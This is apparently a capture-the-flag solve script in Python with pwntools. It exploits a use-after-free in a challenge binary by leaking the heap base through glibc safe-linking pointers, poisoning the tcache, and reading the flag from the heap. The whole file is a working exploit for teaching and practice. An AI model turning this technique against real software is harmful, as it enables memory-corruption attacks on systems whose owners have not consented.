#!/usr/bin/env python3
"""
house-of-water  --  heap UAF -> tcache poisoning -> read the flag out of the heap

The binary
----------
Global arrays in .bss:  chunks[64] @0x4040, sizes[64] @0x4240, freed[64] @0x4440.

    setup()   : buf = malloc(0x80); fgets(buf, 0x80, fopen("./flag.txt","r"));
                => the flag is copied into the FIRST heap allocation and simply
                   left there.  (If the file is missing it stores the dummy
                   "flag{sing_sing_flag_thxt}".)
    do_malloc : chunks[idx] = malloc(size); sizes[idx] = size;   size in [1,0x20000]
                -- no NULL check on chunks[idx]
    do_free   : free(chunks[idx]); freed[idx] = 1;               <-- never NULLed
                => use-after-free
    do_edit   : fread(chunks[idx]+off, 1, len, stdin)            len <= 0x400
    do_show   : hexdump of chunks[idx]+off .. +len
    check_bounds: len in (0,0x400];  off >= (freed[idx] ? -0x10 : 0);
                  off+len <= sizes[idx]
                (the -0x10 "gift" exists precisely so a freed chunk's fd/key
                 can be read and written)

Attack
------
The first heap chunk ever allocated is tcache_perthread_struct, which glibc
creates lazily on the very first malloc() and which occupies the 0x290 bytes
at heap+0x000.  So the flag buffer lives at heap+0x2a0.

1. Two 0x100 chunks A,B (chunk size 0x110).  free(A); free(B):
       A->fd = PROTECT(NULL) = A >> 12
       B->fd = PROTECT(A)    = A ^ (B >> 12)
   show() them (the freed chunks are still readable = the UAF) and recover
       A>>12  -> heap base      (A is in the heap's first page)
2. tcache poisoning: edit(B, 0, p64(T ^ (heap>>12)))  with T = heap+0x290,
   i.e. the "chunk" whose user data (T+0x10 = heap+0x2a0) is the flag.
3. malloc(0x100) twice:  first pop returns B, second pop returns T+0x10.
4. show() that slot with offset 0 -> the flag string.
"""
import os
import re
import sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

ROOT = '/home/kzzz/Documents/code/ctf/ctf7/pwn'
BIN = os.path.join(ROOT, 'solve/house/chal_patched')
elf = ELF(BIN, checksec=False)

SIZE = 0x100
TCACHE_STRUCT = 0x290          # heap+0x290 = first chunk after tcache_perthread_struct
FLAG_USER = TCACHE_STRUCT + 0x10   # heap+0x2a0


def start():
    if args.REMOTE:
        return remote(args.HOST or 'localhost', int(args.PORT or 1337))
    return process(BIN, cwd=os.path.dirname(BIN))


def exploit(io):
    io.recvuntil(b'> ')

    def add(idx, size):
        io.sendline(b'1')
        io.sendlineafter(b'Index: ', str(idx).encode())
        io.sendlineafter(b'Size: ', str(size).encode())
        io.recvuntil(b'> ')

    def free(idx):
        io.sendline(b'2')
        io.sendlineafter(b'Index: ', str(idx).encode())
        io.recvuntil(b'> ')

    def edit(idx, off, data):
        io.sendline(b'3')
        io.sendlineafter(b'Index: ', str(idx).encode())
        io.sendlineafter(b'Offset: ', str(off).encode())
        io.sendlineafter(b'Length: ', str(len(data)).encode())
        io.recvuntil(b'Data (')
        io.sendafter(b'bytes): ', data)          # fread() -> raw bytes, no newline
        io.recvuntil(b'> ')

    def show(idx, off, length):
        io.sendline(b'4')
        io.sendlineafter(b'Index: ', str(idx).encode())
        io.sendlineafter(b'Offset: ', str(off).encode())
        io.sendlineafter(b'Length: ', str(length).encode())
        out = io.recvuntil(b'> ')
        raw = b''.join(bytes.fromhex(h.decode())
                       for h in re.findall(rb'\b[0-9a-f]{2}\b', out))
        return raw[:length]

    # --- 1. two siblings in the same tcache bin --------------------------
    add(0, SIZE)                 # A
    add(1, SIZE)                 # B
    free(0)                      # tcache[0x110] = [A]
    free(1)                      # tcache[0x110] = [B, A]

    # --- 2. safe-linking heap leak through the UAF read ------------------
    fd_a = u64(show(0, 0, 8))    # A->fd == PROTECT(NULL) == A >> 12
    fd_b = u64(show(1, 0, 8))    # B->fd == A ^ (B >> 12)
    a_addr = fd_b ^ fd_a         # A and B share a page -> B>>12 == A>>12
    heap = fd_a << 12
    log.success('A = %#x  (heap+%#x)   heap = %#x', a_addr, a_addr - heap, heap)
    assert a_addr >> 12 == heap >> 12, 'A/B not on the same page'

    # --- 3. tcache poisoning --------------------------------------------
    target = heap + TCACHE_STRUCT               # fake chunk -> user @ flag
    edit(1, 0, p64(target ^ (heap >> 12)))      # B->fd = PROTECT(target)
    log.info('poisoned tcache[0x110]: B -> %#x', target)

    # --- 4. two pops: B, then the fake chunk -----------------------------
    add(2, SIZE)                 # pops B
    add(3, SIZE)                 # pops target -> chunks[3] = heap+0x2a0
    log.info('chunks[3] = %#x  (flag buffer)', heap + FLAG_USER)

    # --- 5. read the flag ------------------------------------------------
    return show(3, 0, 0x80)


def main():
    io = start()
    flag = exploit(io)
    print(flag.decode(errors='replace'))
    m = re.search(rb'flag\{[^}]*\}', flag)
    if m:
        log.success('FLAG = %s', m.group().decode())
    else:
        log.failure('no flag in %r', flag)
        sys.exit(1)
    io.close()


main()
